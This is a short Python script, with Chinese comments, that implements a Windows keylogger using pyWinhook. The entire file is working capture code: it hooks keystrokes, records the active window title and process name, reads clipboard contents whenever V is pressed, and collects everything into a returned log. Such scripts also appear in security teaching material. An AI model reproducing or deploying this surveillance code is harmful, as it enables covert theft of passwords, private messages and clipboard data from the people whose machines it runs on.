'''
利用pyWinhook库编写的简单钩子脚本
'''
from ctypes import byref,create_string_buffer,c_ulong,windll
from io import StringIO

import sys
import time
import pythoncom
import pyWinhook
import win32clipboard
#! Hook结束时间
TIMEOUT = 10

class KeyLogger(object):
    '''键盘记录器'''
    def __init__(self):
        self.current_window = None

    def get_current_procss(self):
        '''获取活跃窗口与相应进程ID'''
        #! 获取活跃窗口句柄
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        #! 获取窗口对应进程ID
        windll.user32.GetWindowThreadProcessId(hwnd,byref(pid))
        process_id = f"{pid.value}"
        executable = create_string_buffer(1024)
        #! 打开进程
        h_process = windll.kernel32.OpenProcess(0x400|0x10,False,pid)
        #! 利用句柄找到进程实际程序名
        windll.psapi.GetModuleBaseNameA(h_process,None,byref(executable),1024)
        window_title = create_string_buffer(1024)
        #! 获取窗口标题栏的完整文本
        windll.user32.GetWindowTextA(hwnd,byref(window_title),512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError :
            print(f"{UnicodeDecodeError}:Window name unknown")
        #! 输出抓取到的信息
        print("\n",process_id,executable.value.decode(),self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self,event):
        '''回调函数，用于与KeyDown绑定'''
        #! 判断是否切换窗口，是则跟进
        if event.WindowName != self.current_window:
            self.get_current_procss()
        #! 打印可打印字符
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii),end="")
        else:
            #! 记录剪贴板
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
        return True

def main()->str:
    '''入口'''
    #! 备份标准输出后重定向到StringIO对象
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    key_logger = KeyLogger()
    hook_manager = pyWinhook.HookManager()
    hook_manager.KeyDown = key_logger.mykeystroke
    hook_manager.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(main())
